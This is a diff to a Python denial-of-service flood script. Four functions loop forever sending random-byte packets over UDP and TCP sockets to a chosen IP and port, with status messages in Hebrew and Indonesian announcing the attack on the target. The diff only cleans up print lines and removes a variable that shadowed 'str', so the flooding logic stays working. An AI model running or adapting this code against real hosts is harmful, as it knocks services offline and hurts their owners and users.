@@ -88,21 +88,19 @@ time.sleep(5),
 def run():
 	data = random._urandom(1024)
 	i = random.choice(("[+]","[-]"))
-	str = u
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 			addr = (str(ip),int(port))
 			for x in range(times):
 				s.sendto(data,addr)
-			print("[+]  \033[32mTCP \033[37m" +str(u)+ " \033[33mנפגע על ידי סערה מדברית\033[0m")
+			print("[+]  \033[32mTCP \033[33mנפגע על ידי סערה מדברית\033[0m " +ip+ "")
 		except:
 			print("[-]  \033[31mMay be down\033[0m")
 
 def run2():
 	data = random._urandom(999)
 	i = random.choice(("[+]","[-]"))
-	str = u
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -110,7 +108,7 @@ def run2():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[+] \033[37m" +str(u)+ " \033[96mPermintaan \033[92mPengiriman \033[34mPesan\033[0m")
+			print("[+]  \033[96mPermintaan \033[92mPengiriman \033[34mPesan\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
@@ -119,7 +117,6 @@ def run2():
 def run3():
 	data = random._urandom(818)
 	i = random.choice(("[+]","[-]"))
-	str = u
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -127,7 +124,7 @@ def run3():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[+] \033[37m" +str(u)+ " \033[32mMemulai \033[95mSerangan \033[0m")
+			print("[+] \033[32mMemulai \033[95mSerangan \033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
@@ -136,7 +133,6 @@ def run3():
 def run4():
 	data = random._urandom(16)
 	i = random.choice(("[+]","[-]"))
-	str = u
 	while True:
 		try:
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -144,7 +140,7 @@ def run4():
 			s.send(data)
 			for x in range(times):
 				s.send(data)
-			print("[+] \033[37m" +str(u)+ " \033[32mTarget \033[33mTerpantau \033[32m"+ip+"\033[0m")
+			print("[+]  \033[32mTarget \033[33mTerpantau \033[32m" +ip+ "\033[0m")
 		except:
 			s.close()
 			print("[-]  \033[31mMay be down\033[0m")
